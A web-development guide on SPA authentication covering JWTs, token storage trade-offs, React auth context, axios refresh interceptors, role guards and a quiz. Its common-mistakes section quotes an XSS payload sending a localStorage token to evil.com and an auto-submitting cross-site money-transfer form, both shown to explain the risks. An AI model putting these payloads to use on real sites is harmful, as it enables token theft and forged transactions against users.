---
title: Authentication
layout: doc
slug: authentication
---

# Authentication

> - Verifies user identity before granting access
> - Token-based systems (JWT) for SPAs
> - Balances security between XSS and CSRF protection

## Key Insight

**Authentication in SPAs uses token-based systems (JWT) stored in memory or httpOnly cookies**, where login returns an access token (short-lived, 15min) and refresh token (long-lived, 7days). The access token includes in Authorization header (`Bearer eyJ...`) proves identity for API requests, refresh token exchanges for new access token when expired, and logout clears all tokens preventing further API access. **The critical security trade-off**: localStorage is vulnerable to XSS attacks (JavaScript can steal tokens), httpOnly cookies prevent XSS but require CSRF protection, and memory storage (React state) is most secure but lost on page refresh unless combined with refresh token flow.

## Detailed Description

Authentication is the process of **verifying user identity** before granting access to protected resources. In modern Single Page Applications, this involves maintaining user session state across multiple API calls without requiring re-login on every request.

**Traditional Session-based Auth (Server-side Sessions):**
- Server creates session after login, stores in database/Redis with session ID
- Session ID sent to client as cookie
- Every request includes cookie, server looks up session to verify user
- **Problems for SPAs**: Doesn't scale horizontally (session stored on one server), CORS complications, not ideal for microservices

**Token-based Authentication (Modern SPAs):**
- Server creates JWT (JSON Web Token) after login containing user info + expiration
- JWT sent to client, client stores token (memory, localStorage, cookie)
- Every API request includes JWT in Authorization header: `Authorization: Bearer <token>`
- Server verifies JWT signature without database lookup (stateless)
- **Benefits**: Stateless (no server-side session storage), works with CORS, scales horizontally, microservice-friendly

**JWT Structure (3 parts separated by dots):**

1. **Header**: Algorithm + token type → `{"alg": "HS256", "typ": "JWT"}`
2. **Payload**: User data + expiration → `{"userId": 123, "role": "admin", "exp": 1672531200}`
3. **Signature**: Prevents tampering → `HMACSHA256(header + payload, secret)`

**Core Auth Concepts:**

1. **Login Flow**: Submit credentials → Server validates → Return access token + refresh token → Store tokens → Redirect to dashboard
2. **Protected Routes**: Check if user is authenticated before rendering route, redirect to /login if not
3. **Token Refresh**: Access token expires (15min) → Use refresh token to get new access token → Continue without re-login
4. **Logout**: Clear tokens from storage → Optionally blacklist refresh token server-side → Redirect to /login
5. **Role-Based Access Control (RBAC)**: JWT payload includes user roles → Check roles before showing UI/making API calls

**Token Storage Options (Security Trade-offs):**

| Storage | XSS Vulnerable? | CSRF Vulnerable? | Persists Refresh? | Best For |
|---------|-----------------|------------------|-------------------|----------|
| **localStorage** | ✅ Yes (JS can read) | ❌ No | ✅ Yes | Prototypes (not production) |
| **sessionStorage** | ✅ Yes (JS can read) | ❌ No | ❌ No (clears on tab close) | Testing |
| **Memory (React state)** | ❌ No | ❌ No | ❌ No (lost on refresh) | Most secure + refresh token |
| **httpOnly cookie** | ❌ No (JS can't read) | ✅ Yes (needs CSRF token) | ✅ Yes | Production (with CSRF protection) |

**Refresh Token Pattern:**
- Access token: Short-lived (15 minutes), included in every API request, stored in memory
- Refresh token: Long-lived (7 days), httpOnly cookie, used only to get new access token
- When access token expires: Call `/auth/refresh` with refresh token → Get new access token → Continue
- Why? Limits damage if access token stolen (expires quickly), refresh token in httpOnly cookie can't be stolen by JavaScript

**Common Auth Patterns:**

1. **Protected Route Component**: Wrapper that checks authentication before rendering child routes
2. **useAuth Hook**: Provides login, logout, user info, isAuthenticated state
3. **Axios Interceptors**: Automatically add Authorization header to requests, handle 401 errors, refresh tokens
4. **Auth Context**: React Context providing authentication state and actions globally

**Why Authentication Matters:**
- **Security**: Prevent unauthorized access to user data and admin features
- **Personalization**: Show user-specific content, settings, saved preferences
- **Authorization**: Different permissions for users vs admins vs guests
- **Compliance**: GDPR, HIPAA require user identity verification for data access
- **Business Logic**: Subscriptions, payments, user history all require authentication

## Code Examples

### Basic Example: Login Flow with JWT

```javascript
// ===== AUTH CONTEXT + LOGIN =====
// AuthContext.js - Global authentication state

import React, { createContext, useContext, useState, useEffect } from 'react';

const AuthContext = createContext(null);

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const [token, setToken] = useState(null);
  const [loading, setLoading] = useState(true);
  
  // Check if user is already logged in on mount
  useEffect(() => {
    const storedToken = localStorage.getItem('token');
    if (storedToken) {
      // Validate token and get user info
      validateToken(storedToken);
    } else {
      setLoading(false);
    }
  }, []);
  
  const validateToken = async (token) => {
    try {
      const response = await fetch('/api/auth/me', {
        headers: {
          'Authorization': `Bearer ${token}`
        }
      });
      
      if (response.ok) {
        const userData = await response.json();
        setUser(userData);
        setToken(token);
      } else {
        // Token invalid, clear it
        localStorage.removeItem('token');
      }
    } catch (error) {
      console.error('Token validation failed:', error);
    } finally {
      setLoading(false);
    }
  };
  
  const login = async (email, password) => {
    try {
      const response = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      });
      
      if (!response.ok) {
        throw new Error('Login failed');
      }
      
      const data = await response.json();
      const { access_token, user: userData } = data;
      
      // Store token
      localStorage.setItem('token', access_token);
      setToken(access_token);
      setUser(userData);
      
      return { success: true };
    } catch (error) {
      return { success: false, error: error.message };
    }
  };
  
  const logout = () => {
    localStorage.removeItem('token');
    setToken(null);
    setUser(null);
  };
  
  const value = {
    user,
    token,
    login,
    logout,
    isAuthenticated: !!user,
    loading
  };
  
  return (
    <AuthContext.Provider value={value}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within AuthProvider');
  }
  return context;
}


// ===== LOGIN FORM COMPONENT =====
// LoginPage.js - Login form using useAuth hook

import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from './AuthContext';

function LoginPage() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  const { login } = useAuth();
  const navigate = useNavigate();
  
  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setIsSubmitting(true);
    
    const result = await login(email, password);
    
    if (result.success) {
      navigate('/dashboard');
    } else {
      setError(result.error || 'Invalid email or password');
    }
    
    setIsSubmitting(false);
  };
  
  return (
    <div className="login-page">
      <h1>Login</h1>
      
      {error && (
        <div className="error-message" role="alert">
          {error}
        </div>
      )}
      
      <form onSubmit={handleSubmit}>
        <div className="form-group">
          <label htmlFor="email">Email</label>
          <input
            id="email"
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
          />
        </div>
        
        <div className="form-group">
          <label htmlFor="password">Password</label>
          <input
            id="password"
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
        </div>
        
        <button type="submit" disabled={isSubmitting}>
          {isSubmitting ? 'Logging in...' : 'Login'}
        </button>
      </form>
    </div>
  );
}

export default LoginPage;


// ===== PROTECTED ROUTE =====
// ProtectedRoute.js - Redirect to login if not authenticated

import { Navigate } from 'react-router-dom';
import { useAuth } from './AuthContext';

{% raw %}
function ProtectedRoute({ children }) {
  const { isAuthenticated, loading } = useAuth();
  
  if (loading) {
    return <div>Loading...</div>;
  }
  
  if (!isAuthenticated) {
    // Redirect to login, save attempted URL
    return <Navigate to="/login" state={{ from: location.pathname }} replace />;
  }
  
  return children;
}
{% endraw %}

export default ProtectedRoute;


// ===== APP ROUTING =====
// App.js - Setup routes with protection

import { BrowserRouter, Routes, Route } from 'react-router-dom';
import { AuthProvider } from './AuthContext';
import LoginPage from './LoginPage';
import Dashboard from './Dashboard';
import ProtectedRoute from './ProtectedRoute';

function App() {
  return (
    <AuthProvider>
      <BrowserRouter>
        <Routes>
          <Route path="/login" element={<LoginPage />} />
          
          <Route
            path="/dashboard"
            element={
              <ProtectedRoute>
                <Dashboard />
              </ProtectedRoute>
            }
          />
          
          <Route path="/" element={<Navigate to="/dashboard" />} />
        </Routes>
      </BrowserRouter>
    </AuthProvider>
  );
}

export default App;
```

### Practical Example: Axios Interceptors with Token Refresh

```javascript
// ===== AXIOS INSTANCE WITH INTERCEPTORS =====
// api.js - Automatic token handling

import axios from 'axios';

const api = axios.create({
  baseURL: '/api',
  headers: {
    'Content-Type': 'application/json'
  }
});

// Request interceptor - Add token to every request
api.interceptors.request.use(
  (config) => {
    const token = localStorage.getItem('token');
    if (token) {
      config.headers.Authorization = `Bearer ${token}`;
    }
    return config;
  },
  (error) => {
    return Promise.reject(error);
  }
);

// Response interceptor - Handle 401 errors and refresh token
let isRefreshing = false;
let failedQueue = [];

const processQueue = (error, token = null) => {
  failedQueue.forEach(prom => {
    if (error) {
      prom.reject(error);
    } else {
      prom.resolve(token);
    }
  });
  
  failedQueue = [];
};

api.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;
    
    // If 401 and we haven't tried to refresh yet
    if (error.response?.status === 401 && !originalRequest._retry) {
      if (isRefreshing) {
        // Already refreshing, queue this request
        return new Promise((resolve, reject) => {
          failedQueue.push({ resolve, reject });
        })
          .then(token => {
            originalRequest.headers.Authorization = `Bearer ${token}`;
            return api(originalRequest);
          })
          .catch(err => Promise.reject(err));
      }
      
      originalRequest._retry = true;
      isRefreshing = true;
      
      try {
        // Call refresh endpoint
        const response = await axios.post('/api/auth/refresh', {
          refresh_token: localStorage.getItem('refresh_token')
        });
        
        const { access_token } = response.data;
        localStorage.setItem('token', access_token);
        
        // Update default header
        api.defaults.headers.Authorization = `Bearer ${access_token}`;
        originalRequest.headers.Authorization = `Bearer ${access_token}`;
        
        processQueue(null, access_token);
        
        return api(originalRequest);
      } catch (refreshError) {
        processQueue(refreshError, null);
        
        // Refresh failed, logout user
        localStorage.removeItem('token');
        localStorage.removeItem('refresh_token');
        window.location.href = '/login';
        
        return Promise.reject(refreshError);
      } finally {
        isRefreshing = false;
      }
    }
    
    return Promise.reject(error);
  }
);

export default api;


// ===== USING THE API INSTANCE =====
// UserProfile.js - Fetch protected data

import React, { useEffect, useState } from 'react';
import api from './api';

function UserProfile() {
  const [profile, setProfile] = useState(null);
  const [loading, setLoading] = useState(true);
  
  useEffect(() => {
    fetchProfile();
  }, []);
  
  const fetchProfile = async () => {
    try {
      // Token automatically added by interceptor
      const response = await api.get('/users/me');
      setProfile(response.data);
    } catch (error) {
      console.error('Failed to fetch profile:', error);
    } finally {
      setLoading(false);
    }
  };
  
  const updateProfile = async (updates) => {
    try {
      const response = await api.patch('/users/me', updates);
      setProfile(response.data);
    } catch (error) {
      console.error('Failed to update profile:', error);
    }
  };
  
  if (loading) return <div>Loading profile...</div>;
  if (!profile) return <div>No profile found</div>;
  
  return (
    <div>
      <h1>{profile.name}</h1>
      <p>Email: {profile.email}</p>
      <p>Role: {profile.role}</p>
    </div>
  );
}

export default UserProfile;
```

### Advanced Example: Secure Token Storage with Refresh Flow

```javascript
// ===== SECURE AUTH SERVICE =====
// authService.js - Memory storage + httpOnly cookies for refresh token

class AuthService {
  constructor() {
    this.accessToken = null;  // Stored in memory only
    this.tokenExpirationTime = null;
    this.refreshTokenTimer = null;
  }
  
  async login(email, password) {
    try {
      const response = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
        credentials: 'include'  // Include cookies (refresh token)
      });
      
      if (!response.ok) {
        throw new Error('Login failed');
      }
      
      const data = await response.json();
      
      // Access token in memory
      this.accessToken = data.access_token;
      this.tokenExpirationTime = Date.now() + (data.expires_in * 1000);
      
      // Refresh token sent as httpOnly cookie by server
      // JavaScript cannot access it (XSS protection)
      
      // Schedule automatic refresh before expiration
      this.scheduleTokenRefresh();
      
      return { success: true, user: data.user };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }
  
  scheduleTokenRefresh() {
    // Clear existing timer
    if (this.refreshTokenTimer) {
      clearTimeout(this.refreshTokenTimer);
    }
    
    // Refresh 1 minute before expiration
    const refreshTime = this.tokenExpirationTime - Date.now() - 60000;
    
    if (refreshTime > 0) {
      this.refreshTokenTimer = setTimeout(() => {
        this.refreshToken();
      }, refreshTime);
    }
  }
  
  async refreshToken() {
    try {
      const response = await fetch('/api/auth/refresh', {
        method: 'POST',
        credentials: 'include'  // Send httpOnly cookie with refresh token
      });
      
      if (!response.ok) {
        throw new Error('Token refresh failed');
      }
      
      const data = await response.json();
      
      // Update access token
      this.accessToken = data.access_token;
      this.tokenExpirationTime = Date.now() + (data.expires_in * 1000);
      
      // Schedule next refresh
      this.scheduleTokenRefresh();
      
      return true;
    } catch (error) {
      // Refresh failed, logout user
      this.logout();
      window.location.href = '/login';
      return false;
    }
  }
  
  async logout() {
    try {
      // Call logout endpoint to invalidate refresh token
      await fetch('/api/auth/logout', {
        method: 'POST',
        credentials: 'include'
      });
    } catch (error) {
      console.error('Logout error:', error);
    } finally {
      // Clear access token from memory
      this.accessToken = null;
      this.tokenExpirationTime = null;
      
      if (this.refreshTokenTimer) {
        clearTimeout(this.refreshTokenTimer);
        this.refreshTokenTimer = null;
      }
    }
  }
  
  getAccessToken() {
    // Check if token is still valid
    if (this.accessToken && Date.now() < this.tokenExpirationTime) {
      return this.accessToken;
    }
    return null;
  }
  
  isAuthenticated() {
    return this.getAccessToken() !== null;
  }
}

export default new AuthService();


// ===== ROLE-BASED ACCESS CONTROL =====
// RoleGuard.js - Check user roles for access

import { useAuth } from './AuthContext';
import { Navigate } from 'react-router-dom';

function RoleGuard({ children, requiredRole }) {
  const { user, isAuthenticated, loading } = useAuth();
  
  if (loading) {
    return <div>Loading...</div>;
  }
  
  if (!isAuthenticated) {
    return <Navigate to="/login" replace />;
  }
  
  // Check if user has required role
  if (requiredRole && user.role !== requiredRole) {
    return <Navigate to="/unauthorized" replace />;
  }
  
  return children;
}

export default RoleGuard;


// ===== USAGE IN ROUTES =====
// AdminPanel.js - Only accessible to admins

import RoleGuard from './RoleGuard';

function App() {
  return (
    <Routes>
      <Route path="/login" element={<LoginPage />} />
      
      <Route
        path="/admin"
        element={
          <RoleGuard requiredRole="admin">
            <AdminPanel />
          </RoleGuard>
        }
      />
      
      <Route
        path="/dashboard"
        element={
          <ProtectedRoute>
            <Dashboard />
          </ProtectedRoute>
        }
      />
    </Routes>
  );
}


// ===== DECODE JWT TO GET USER INFO =====
// jwtUtils.js - Parse JWT payload

export function decodeJWT(token) {
  try {
    const parts = token.split('.');
    if (parts.length !== 3) {
      throw new Error('Invalid JWT');
    }
    
    // Decode base64 payload
    const payload = JSON.parse(atob(parts[1]));
    return payload;
  } catch (error) {
    console.error('Failed to decode JWT:', error);
    return null;
  }
}

export function isTokenExpired(token) {
  const payload = decodeJWT(token);
  if (!payload || !payload.exp) {
    return true;
  }
  
  // exp is in seconds, Date.now() is in milliseconds
  return Date.now() >= payload.exp * 1000;
}

// Usage
const token = localStorage.getItem('token');
if (token && !isTokenExpired(token)) {
  const payload = decodeJWT(token);
  console.log('User ID:', payload.userId);
  console.log('Roles:', payload.roles);
}
```

## Common Mistakes

### 1. Storing JWT in localStorage (XSS Vulnerability)
**Mistake:** Storing authentication tokens in localStorage where malicious JavaScript can steal them.

```javascript
// ❌ BAD: localStorage vulnerable to XSS attacks
function login(email, password) {
  fetch('/api/login', {
    method: 'POST',
    body: JSON.stringify({ email, password })
  })
    .then(r => r.json())
    .then(data => {
      localStorage.setItem('token', data.access_token);
      // If attacker injects <script> tag via XSS:
      // <script>
      //   fetch('https://evil.com/steal?token=' + localStorage.getItem('token'))
      // </script>
      // Now attacker has your token!
    });
}


// ✅ GOOD: Store in memory + httpOnly cookie for refresh token
class AuthService {
  constructor() {
    this.accessToken = null;  // Memory only, XSS can't access
  }
  
  async login(email, password) {
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password }),
      credentials: 'include'  // Server sets httpOnly cookie
    });
    
    const data = await response.json();
    
    // Access token in memory (lost on refresh, but short-lived)
    this.accessToken = data.access_token;
    
    // Refresh token sent as httpOnly cookie
    // JavaScript CANNOT access it: document.cookie won't show it
    // XSS attacks can't steal it
  }
  
  getToken() {
    return this.accessToken;
  }
}

// Server-side (Node.js/Express):
app.post('/api/login', (req, res) => {
  // ... validate credentials ...
  
  const accessToken = generateAccessToken(user);  // 15 min expiry
  const refreshToken = generateRefreshToken(user);  // 7 days expiry
  
  // Send refresh token as httpOnly cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,  // JavaScript can't access
    secure: true,    // HTTPS only
    sameSite: 'strict',  // CSRF protection
    maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
  });
  
  res.json({
    access_token: accessToken,
    expires_in: 900  // 15 minutes
  });
});
```

**Why it matters:** XSS attacks can steal localStorage tokens, gaining full account access. httpOnly cookies can't be accessed by JavaScript.

### 2. Not Handling Token Expiration
**Mistake:** Continuing to use expired tokens, causing 401 errors on every request.

```javascript
// ❌ BAD: No expiration handling
function fetchUserData() {
  const token = localStorage.getItem('token');
  
  fetch('/api/users/me', {
    headers: {
      'Authorization': `Bearer ${token}`
    }
  })
    .then(r => {
      if (r.status === 401) {
        // Token expired! But user just sees "Unauthorized"
        // No automatic refresh, user must login again
        alert('Please login again');
      }
      return r.json();
    });
}


// ✅ GOOD: Automatic token refresh on 401
let isRefreshing = false;
let refreshSubscribers = [];

api.interceptors.response.use(
  response => response,
  async error => {
    const originalRequest = error.config;
    
    if (error.response?.status === 401 && !originalRequest._retry) {
      if (isRefreshing) {
        // Already refreshing, wait for it
        return new Promise(resolve => {
          refreshSubscribers.push((token) => {
            originalRequest.headers.Authorization = `Bearer ${token}`;
            resolve(api(originalRequest));
          });
        });
      }
      
      originalRequest._retry = true;
      isRefreshing = true;
      
      try {
        const { data } = await axios.post('/api/auth/refresh', {}, {
          withCredentials: true  // Send httpOnly cookie
        });
        
        const newToken = data.access_token;
        authService.accessToken = newToken;
        
        // Retry all queued requests
        refreshSubscribers.forEach(callback => callback(newToken));
        refreshSubscribers = [];
        
        originalRequest.headers.Authorization = `Bearer ${newToken}`;
        return api(originalRequest);
      } catch (refreshError) {
        // Refresh failed, logout
        authService.logout();
        window.location.href = '/login';
        throw refreshError;
      } finally {
        isRefreshing = false;
      }
    }
    
    return Promise.reject(error);
  }
);
```

**Why it matters:** Users shouldn't have to re-login every 15 minutes. Refresh tokens enable seamless token renewal.

### 3. Missing CSRF Protection with Cookies
**Mistake:** Using cookies for auth without CSRF tokens, allowing cross-site request forgery.

```javascript
// ❌ BAD: Cookie-based auth without CSRF protection
// Server sets auth cookie
app.post('/api/login', (req, res) => {
  res.cookie('auth', token, { httpOnly: true });
  res.json({ success: true });
});

// Browser automatically sends cookie with EVERY request
// Attacker creates malicious site:
// <form action="https://yoursite.com/api/transfer-money" method="POST">
//   <input name="to" value="attacker" />
//   <input name="amount" value="1000" />
// </form>
// <script>document.forms[0].submit()</script>
//
// When victim visits attacker site, form submits with victim's cookie!


// ✅ GOOD: CSRF token verification
// Server generates CSRF token and sends in cookie + header
app.post('/api/login', (req, res) => {
  const csrfToken = generateCSRFToken();
  
  res.cookie('auth', authToken, { httpOnly: true, sameSite: 'strict' });
  res.cookie('csrf', csrfToken, { sameSite: 'strict' });  // Readable by JS
  
  res.json({ success: true, csrfToken });
});

// Client includes CSRF token in header
axios.interceptors.request.use(config => {
  const csrfToken = getCookie('csrf');
  if (csrfToken) {
    config.headers['X-CSRF-Token'] = csrfToken;
  }
  return config;
});

// Server verifies token matches
app.post('/api/transfer-money', (req, res) => {
  const csrfFromHeader = req.headers['x-csrf-token'];
  const csrfFromCookie = req.cookies.csrf;
  
  if (csrfFromHeader !== csrfFromCookie) {
    return res.status(403).json({ error: 'CSRF validation failed' });
  }
  
  // Process transfer...
});

// Attacker can't get CSRF token (different origin)
// sameSite='strict' prevents cookie from being sent cross-origin
```

**Why it matters:** CSRF attacks trick browsers into making authenticated requests to your site from malicious sites.

## Token Service

### JWT Authentication

The ACC uses JWT (JSON Web Tokens) for stateless authentication, meaning the server does not need to store session data. The token contains information about the user and is signed to prevent tampering.

**JWT Structure**: 
- Header: Contains metadata about the token (algorithm and type).
- Payload: Contains claims (e.g., user ID, roles).
- Signature: Verifies the integrity of the token.

### Token Expiration
- **Access Token**: Typically has a short lifespan (e.g., 1 hour).
- **Refresh Token**: Longer lifespan (e.g., 30 days) and is used to obtain a new access token once it expires.

### Example of Token Generation:
```json
{
  "user_id": 123456,
  "email": "user@example.com",
  "roles": ["user", "admin"],
  "iat": 1627905189,
  "exp": 1627908789
}
```

---

## Roles and Permissions

The ACC supports Role-Based Access Control (RBAC). Roles are assigned to users, and these roles determine what actions they can perform within the application. 

### Role Definitions:
- **Admin**: Full access to all resources and configuration settings.
- **User**: Limited access to resources and personal data.
- **Guest**: Can view publicly available content only.

### Permission Checks:
Each API request that requires authorization must include a valid JWT or session token. Based on the user's role, the system will grant or deny access to specific resources.

Example:
- **Admin** can view and modify user data, while **User** can only access their own data.

---

## Session Management

- **Create Session**: Upon successful login, a session is created.
- **Session Expiration**: The session may expire after a set time or if the user logs out.
- **Session Termination**: Sessions can be manually terminated via an API endpoint.

---

## Multi-factor Authentication (MFA) (Optional)

If enabled, users will be prompted for an additional form of authentication, such as a one-time passcode (OTP) sent via email or SMS, after entering their primary credentials.

---

## API Endpoints

| Endpoint                          | Method | Description                                            |
|-----------------------------------|--------|--------------------------------------------------------|
| `/auth/login`                     | POST   | Login and obtain access token                         |
| `/auth/register`                  | POST   | Register a new user                                   |
| `/auth/forgot-password`           | POST   | Request password reset                                |
| `/auth/reset-password`            | POST   | Reset password using a token                          |
| `/auth/refresh-token`             | POST   | Obtain a new access token using refresh token         |
| `/auth/logout`                    | POST   | Log out (terminate session)                           |

---

## Error Handling

- **400 Bad Request**: Input validation failed.
- **401 Unauthorized**: Authentication required or failed.
- **403 Forbidden**: Insufficient permissions.
- **404 Not Found**: Resource not found (e.g., user).
- **500 Internal Server Error**: An unexpected error occurred.

---

## Security Considerations

- **Password Storage**: Ensure passwords are hashed using a secure algorithm (e.g., bcrypt or Argon2).
- **Token Storage**: Tokens should be securely stored, ideally in HTTP-only cookies.
- **Rate Limiting**: Implement rate limiting to prevent brute-force attacks.

## Quick Quiz

{% include quiz.html id="authentication-1"
   question="Where should a JWT access token be stored on the client?"
   options="A|Hardcoded in a data attribute;;B|In memory (variable or short-lived cache) with a rotating refresh token in an httpOnly, Secure, SameSite cookie — localStorage is readable by any XSS-injected script, which is a critical token exfiltration vector;;C|In the URL hash;;D|localStorage with a long expiry"
   correct="B"
   explanation="Memory + httpOnly refresh cookie is the defence-in-depth default. A stored access token is as good as compromised the moment XSS lands." %}

{% include quiz.html id="authentication-2"
   question="How do you implement silent token refresh without logging users out mid-session?"
   options="A|When the API returns 401, an interceptor pauses in-flight requests, calls the refresh endpoint (using a refresh token in an httpOnly cookie), swaps in the new access token, and retries the queued requests — transparent to the UI;;B|Never expire tokens;;C|Poll the refresh endpoint every second;;D|Ask the user to re-log in whenever the token expires"
   correct="A"
   explanation="Coalescing in-flight requests during refresh avoids stampedes, and the httpOnly refresh cookie means JS never touches the long-lived secret." %}

{% include quiz.html id="authentication-3"
   question="What's the cleanest way to protect routes in a React app?"
   options="A|Use window.location everywhere;;B|Redirect in useEffect on every page;;C|Check auth in every page component individually;;D|Wrap protected routes in a ProtectedRoute / RequireAuth component (or a layout route) that reads auth state and redirects to /login when unauthenticated, preserving the intended destination so the user lands back there after signing in"
   correct="D"
   explanation="A route-level guard keeps auth logic in one spot, handles return-to-URL cleanly, and composes with role-based guards for authorization." %}

{% include quiz.html id="authentication-4"
   question="What is the difference between authentication and authorization?"
   options="A|Authorization happens first;;B|They are synonyms;;C|Authorization is a UI concern only;;D|Authentication answers &quot;who are you?&quot; (login, MFA, SSO); authorization answers &quot;what are you allowed to do?&quot; (roles, permissions, ACLs). You need the first before you can meaningfully enforce the second"
   correct="D"
   explanation="AuthN proves identity; AuthZ enforces policy. Many security bugs come from conflating the two or from checking only one at the wrong layer." %}

{% include quiz.html id="authentication-5"
   question="Which of these is NOT a standard production hardening for auth?"
   options="A|Short-lived access tokens with rotating refresh tokens;;B|HTTPS everywhere and Secure+SameSite+httpOnly cookies;;C|Rate-limiting login and refresh endpoints, plus MFA for sensitive actions;;D|Logging plaintext passwords in audit trails so you can debug"
   correct="D"
   explanation="Never log plaintext credentials — it turns every log aggregator into a secondary credentials breach risk. A/B/C are the usual defence-in-depth stack." %}

## References
- https://zivukushingai.medium.com/everything-you-need-to-know-about-frontend-and-backend-authentication-ultimate-guide-7142a752249c
- https://webauthn.guide/